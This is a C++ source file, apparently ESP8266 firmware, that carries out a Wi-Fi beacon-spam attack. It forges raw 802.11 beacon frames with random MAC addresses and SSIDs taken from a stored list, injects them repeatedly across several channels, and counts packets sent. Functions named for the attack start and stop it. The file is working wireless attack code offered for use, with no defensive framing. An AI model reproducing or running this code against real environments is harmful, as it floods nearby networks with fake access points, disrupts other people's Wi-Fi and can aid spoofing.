#include "../include/beacon.h"
#include "../include/globals.h"
#include <regex>

uint8_t wifi_channels[] = {3, 7, 11};
bool enable_wpa2_mode = false;
bool pad_ssid_names = true;

char blank_ssid[MAX_SSID_LENGTH];
uint8_t current_channel_idx = 0;
uint8_t device_mac[MAC_ADDRESS_LENGTH];
uint8_t active_channel = 1;
uint32_t time_now = 0;
uint32_t frame_size = 0;
uint32_t sent_packets = 0;
uint32_t last_attack = 0;
uint32_t rate_check_time = 0;

uint8_t beacon_frame[BEACON_FRAME_SIZE] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00, 0x83, 0x51, 0xf7, 0x8f,
    0x0f, 0x00, 0x00, 0x00, 0xe8, 0x03,
    0x31, 0x00, 0x00, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20,

    0x01, 0x08, 0x82, 0x84, 0x8b, 
    0x96, 0x24, 0x30, 0x48, 0x6c,

    0x03, 0x01, 0x01,

    0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x02, 0x00, 0x00, 0x0f,
    0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
    0x00, 0x00};

void switch_channel() {
  if (sizeof(wifi_channels) > 1) {
    uint8_t next_ch = wifi_channels[current_channel_idx];
    current_channel_idx++;
    if (current_channel_idx >= sizeof(wifi_channels))
      current_channel_idx = 0;

    if (next_ch != active_channel && next_ch >= 1 && next_ch <= 14) {
      active_channel = next_ch;
      wifi_set_channel(active_channel);
    }
  }
}
  

void generate_random_mac() {
  for (int idx = 0; idx < MAC_ADDRESS_LENGTH; idx++) {
    device_mac[idx] = random(256);
  }
}
void initialize_system() {
  for (int idx = 0; idx < MAX_SSID_LENGTH; idx++)
    blank_ssid[idx] = ' ';

  randomSeed(os_random());
  setup_beacon_frame();
  generate_random_mac();

  time_now = millis();

  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(wifi_channels[0]);
}

void setup_beacon_frame() {
  frame_size = sizeof(beacon_frame);
  if (enable_wpa2_mode) {
    beacon_frame[34] = 0x31;
  } else {
    beacon_frame[34] = 0x21;
    frame_size -= 26;
  }
}

void process_network_list() {
  int read_pos = 0;
  int char_count = 0;
  int network_id = 1;
  char current_char;
  int networks_length = strlen_P(network_list);

  while (read_pos < networks_length) {
    char_count = 0;
    do {
      current_char = pgm_read_byte(network_list + read_pos + char_count);
      char_count++;
    } while (current_char != '\n' && char_count <= MAX_SSID_LENGTH &&
             read_pos + char_count < networks_length);

    uint8_t name_length = char_count - 1;

    device_mac[5] = network_id;
    network_id++;

    send_single_beacon(&network_list[read_pos], name_length);

    read_pos += char_count;
  }
}

void send_single_beacon(const char *ssid_name, uint8_t ssid_length) {
  memcpy(&beacon_frame[10], device_mac, MAC_ADDRESS_LENGTH);
  memcpy(&beacon_frame[16], device_mac, MAC_ADDRESS_LENGTH);
  memcpy(&beacon_frame[38], blank_ssid, MAX_SSID_LENGTH);
  memcpy_P(&beacon_frame[38], ssid_name, ssid_length);

  beacon_frame[82] = active_channel;

  if (pad_ssid_names) {
    for (int transmission = 0; transmission < TRANSMISSION_REPEATS;
         transmission++) {
      sent_packets += wifi_send_pkt_freedom(beacon_frame, frame_size, 0) == 0;
      delay(1);
    }
  } else {
    uint16_t dynamic_size = (frame_size - MAX_SSID_LENGTH) + ssid_length;
    uint8_t *dynamic_frame = new uint8_t[dynamic_size];

    memcpy(&dynamic_frame[0], &beacon_frame[0], 38 + ssid_length);
    dynamic_frame[37] = ssid_length;
    memcpy(&dynamic_frame[38 + ssid_length], &beacon_frame[70],
           enable_wpa2_mode ? 39 : 13);

    for (int transmission = 0; transmission < TRANSMISSION_REPEATS;
         transmission++) {
      sent_packets +=
          wifi_send_pkt_freedom(dynamic_frame, dynamic_size, 0) == 0;
      delay(1);
    }

    delete dynamic_frame;
  }
}

void transmit_beacon_frames() {
  if (time_now - last_attack > ATTACK_INTERVAL) {
    last_attack = time_now;

    switch_channel();
    process_network_list();
  }
}
  
void display_transmission_rate() {
  if (time_now - rate_check_time > RATE_CHECK_INTERVAL) {
    rate_check_time = time_now;
    Serial.print("Transmission rate: ");
    Serial.print(sent_packets);
    Serial.print(" packets/sec\r");
    sent_packets = 0;
  }
}

void stopBeaconAttack() {
  wifi_unregister_send_pkt_freedom_cb();
  WiFi.mode(WIFI_OFF);
}